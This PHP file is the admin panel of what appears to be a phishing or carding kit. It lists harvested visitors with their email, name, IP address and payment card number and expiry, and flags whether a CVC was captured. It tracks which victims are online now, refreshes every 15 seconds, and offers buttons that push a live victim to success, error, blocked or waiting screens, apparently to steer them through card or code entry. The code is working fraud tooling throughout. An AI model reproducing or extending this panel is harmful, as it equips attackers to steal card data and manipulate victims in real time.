<?php
session_start();

// Check if admin is logged in
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header("Location: login.php");
    exit();
}

// Load users database
$users_file = 'data/users.db';
$users = file_exists($users_file) ? json_decode(file_get_contents($users_file), true) : [];

// Filter options
$filter = $_GET['filter'] ?? 'all';
$search = $_GET['search'] ?? '';

// Filter users
$filtered_users = [];
foreach ($users as $id => $user) {
    // Apply search filter
    if ($search) {
        $search_lower = strtolower($search);
        $found = false;
        $found = $found || stripos($id, $search) !== false;
        $found = $found || stripos($user['data']['email'] ?? '', $search) !== false;
        $found = $found || stripos($user['data']['name'] ?? '', $search) !== false;
        $found = $found || stripos($user['ip'] ?? '', $search) !== false;
        if (!$found) continue;
    }
    
    // Apply status filter
    if ($filter !== 'all' && $user['status'] !== $filter) {
        continue;
    }
    
    $filtered_users[$id] = $user;
}

// Sort by latest first
uasort($filtered_users, function($a, $b) {
    return ($b['created_at'] ?? 0) <=> ($a['created_at'] ?? 0);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - User Control Panel</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
    .dashboard-container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 20px;
    }
    .stats-cards {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 15px;
        margin-bottom: 30px;
    }
    .stat-card {
        background: white;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        text-align: center;
    }
    .stat-card h3 {
        margin: 0;
        font-size: 2.5em;
        color: #333;
    }
    .stat-card p {
        margin: 5px 0 0;
        color: #666;
    }
    .filters {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
        flex-wrap: wrap;
    }
    .filter-btn {
        padding: 8px 16px;
        border: none;
        border-radius: 5px;
        background: #f0f0f0;
        cursor: pointer;
    }
    .filter-btn.active {
        background: #4a6cf7;
        color: white;
    }
    .users-table {
        background: white;
        border-radius: 10px;
        overflow: hidden;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .user-row {
        display: grid;
        grid-template-columns: 1.5fr 1fr 1fr 1fr 1fr 1fr 1.5fr;
        gap: 10px;
        padding: 15px;
        border-bottom: 1px solid #eee;
        align-items: center;
    }
    .user-row.header {
        font-weight: bold;
        background: #f8f9fa;
    }
    .status-badge {
        padding: 4px 10px;
        border-radius: 20px;
        font-size: 0.85em;
        font-weight: bold;
    }
    .status-waiting { background: #fff3cd; color: #856404; }
    .status-loading { background: #cce5ff; color: #004085; }
    .status-success { background: #d4edda; color: #155724; }
    .status-blocked { background: #f8d7da; color: #721c24; }
    .status-error { background: #f8d7da; color: #721c24; }
    
    /* CONTROL BUTTONS STYLES */
    .control-buttons {
        display: flex;
        gap: 5px;
        flex-wrap: wrap;
    }
    .control-btn {
        padding: 6px 12px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-size: 0.85em;
        font-weight: bold;
        display: flex;
        align-items: center;
        gap: 4px;
        transition: all 0.2s;
    }
    .control-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 3px 6px rgba(0,0,0,0.1);
    }
    .btn-success { background: linear-gradient(135deg, #10b981, #34d399); color: white; }
    .btn-blocked { background: linear-gradient(135deg, #ef4444, #f87171); color: white; }
    .btn-error { background: linear-gradient(135deg, #f59e0b, #fbbf24); color: white; }
    .btn-waiting { background: linear-gradient(135deg, #3b82f6, #60a5fa); color: white; }
    .btn-view { background: #4a6cf7; color: white; }
    
    .search-box {
        flex-grow: 1;
        padding: 8px 15px;
        border: 1px solid #ddd;
        border-radius: 5px;
    }
    
    .live-badge {
        display: inline-block;
        width: 8px;
        height: 8px;
        background: #10b981;
        border-radius: 50%;
        animation: pulse 1.5s infinite;
        margin-right: 5px;
    }
    
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
    </style>
</head>
<body>
    <div class="dashboard-container">
        <h1>User Control Panel</h1>
        
        <!-- Stats Cards -->
        <div class="stats-cards">
            <div class="stat-card">
                <h3><?php echo count($users); ?></h3>
                <p>Total Users</p>
            </div>
            <div class="stat-card">
                <h3><?php 
                    $active = count(array_filter($users, function($u) {
                        return ($u['status'] === 'loading' || $u['status'] === 'waiting') && 
                               (time() - $u['last_seen'] < 60);
                    }));
                    echo $active;
                ?></h3>
                <p>Active Now</p>
            </div>
            <div class="stat-card">
                <h3><?php echo count(array_filter($users, fn($u) => ($u['redirect_to'] ?? '') === 'success.php')); ?></h3>
                <p>Success</p>
            </div>
            <div class="stat-card">
                <h3><?php 
                    $blocked_error = count(array_filter($users, function($u) {
                        return ($u['status'] === 'blocked') || 
                               (($u['redirect_to'] ?? '') === 'error.php');
                    }));
                    echo $blocked_error;
                ?></h3>
                <p>Blocked/Error</p>
            </div>
        </div>
        
        <!-- Filters and Search -->
        <div class="filters">
            <input type="text" class="search-box" placeholder="Search by ID, Email, Name, IP..." 
                   value="<?php echo htmlspecialchars($search); ?>"
                   onkeyup="if(event.key === 'Enter') searchUsers(this.value)">
            
            <div class="filter-group">
                <button class="filter-btn <?php echo $filter === 'all' ? 'active' : ''; ?>" 
                        onclick="setFilter('all')">All Users</button>
                
                <button class="filter-btn <?php echo $filter === 'active' ? 'active' : ''; ?>" 
                        onclick="setFilter('active')">Active Only</button>
                        
                <button class="filter-btn" onclick="location.href='logout.php'">Logout</button>
            </div>
        </div>

        <!-- Users Table -->
        <div class="users-table">
            <div class="user-row header">
                <div>User ID / Email</div>
                <div>Status</div>
                <div>IP Address</div>
                <div>Card Details</div>
                <div>Created</div>
                <div>Last Seen</div>
                <div>Control Actions</div>
            </div>
            
            <?php foreach ($filtered_users as $id => $user): 
                $is_online = ($user['status'] === 'loading' || $user['status'] === 'waiting') && 
                            (time() - $user['last_seen'] < 60);
                $show_controls = in_array($user['status'], ['loading', 'waiting', 'submitted']);
            ?>
            <div class="user-row">
                <div>
                    <div><strong><?php echo substr($id, 0, 15) . '...'; ?></strong></div>
                    <div style="font-size: 0.9em; color: #666;">
                        <?php echo htmlspecialchars($user['data']['email'] ?? 'N/A'); ?>
                    </div>
                    <div style="font-size: 0.8em; color: #888;">
                        <?php echo htmlspecialchars($user['data']['name'] ?? ''); ?>
                    </div>
                </div>
                
                <div>
                    <span class="status-badge status-<?php echo $user['status']; ?>">
                        <?php echo ucfirst($user['status']); ?>
                    </span>
                    <?php if ($is_online): ?>
                    <div style="font-size: 0.8em; color: green; margin-top: 3px;">
                        <span class="live-badge"></span> Online Now
                    </div>
                    <?php endif; ?>
                </div>
                
                <div><?php echo htmlspecialchars($user['ip'] ?? 'N/A'); ?></div>
                
                <div>
                    <?php echo htmlspecialchars($user['data']['card'] ?? '****'); ?><br>
                    <small style="font-size: 0.8em; color: #666;">
                        <?php echo htmlspecialchars($user['data']['expiry'] ?? ''); ?>
                        <?php echo htmlspecialchars($user['data']['cvc'] ? '***' : ''); ?>
                    </small>
                </div>
                
                <div>
                    <?php echo date('H:i', $user['created_at']); ?><br>
                    <small><?php echo date('M d', $user['created_at']); ?></small>
                </div>
                
                <div>
                    <?php echo date('H:i:s', $user['last_seen']); ?><br>
                    <small><?php echo time() - $user['last_seen'] < 60 ? 'Just now' : floor((time() - $user['last_seen']) / 60) . ' min ago'; ?></small>
                </div>
                
                <div>
                    <div class="control-buttons">
                        <!-- View button for all users -->
                        <button class="control-btn btn-view" onclick="viewUser('<?php echo $id; ?>')">
                            👁️ View
                        </button>
                        
                        <!-- Control buttons only for active users -->
                        <?php if ($show_controls): ?>
                        <button class="control-btn btn-success" onclick="sendUserTo('<?php echo $id; ?>', 'success')">
                            ✅ Success
                        </button>
                        <button class="control-btn btn-error" onclick="sendUserTo('<?php echo $id; ?>', 'error')">
                            ⚠️ Error
                        </button>
                        <button class="control-btn btn-blocked" onclick="sendUserTo('<?php echo $id; ?>', 'block')">
                            ❌ Blocked
                        </button>
                        <button class="control-btn btn-waiting" onclick="sendUserTo('<?php echo $id; ?>', 'waiting')">
                            ⏳ Waiting
                        </button>
                        <?php else: ?>
                        <span style="color: #666; font-size: 0.9em;">Completed</span>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            <?php endforeach; ?>
            
            <?php if (empty($filtered_users)): ?>
            <div style="text-align: center; padding: 40px; color: #666;">
                No users found. <?php if ($search): ?>Try a different search.<?php endif; ?>
            </div>
            <?php endif; ?>
        </div>
        
        <p style="text-align: center; margin-top: 20px; color: #666;">
            Showing <?php echo count($filtered_users); ?> of <?php echo count($users); ?> users
            <?php if ($filter !== 'all'): ?> (filtered)<?php endif; ?>
        </p>
    </div>
    
    <script>
    function setFilter(filter) {
        const url = new URL(window.location);
        url.searchParams.set('filter', filter);
        window.location.href = url.toString();
    }
    
    function searchUsers(query) {
        const url = new URL(window.location);
        if (query) {
            url.searchParams.set('search', query);
        } else {
            url.searchParams.delete('search');
        }
        window.location.href = url.toString();
    }
    
    function viewUser(userId) {
        window.open('track.php?key=' + userId, '_blank');
    }
    
    function sendUserTo(userId, action) {
        if (confirm(`Are you sure you want to send this user to ${action.toUpperCase()}?`)) {
            // Use action.php with GET parameters
            window.location.href = `action.php?id=${encodeURIComponent(userId)}&decision=${action}`;
        }
    }
    
    // Auto-refresh every 15 seconds for real-time updates
    setTimeout(() => {
        if (!document.hidden) {
            location.reload();
        }
    }, 15000);
    
    // Filter for active users
    if (window.location.search.includes('filter=active')) {
        // Show only users with loading/waiting status
        document.addEventListener('DOMContentLoaded', function() {
            const rows = document.querySelectorAll('.user-row:not(.header)');
            rows.forEach(row => {
                const statusCell = row.children[1];
                const statusText = statusCell.textContent.toLowerCase();
                if (!statusText.includes('loading') && !statusText.includes('waiting')) {
                    row.style.display = 'none';
                }
            });
        });
    }
    </script>
</body>
</html>
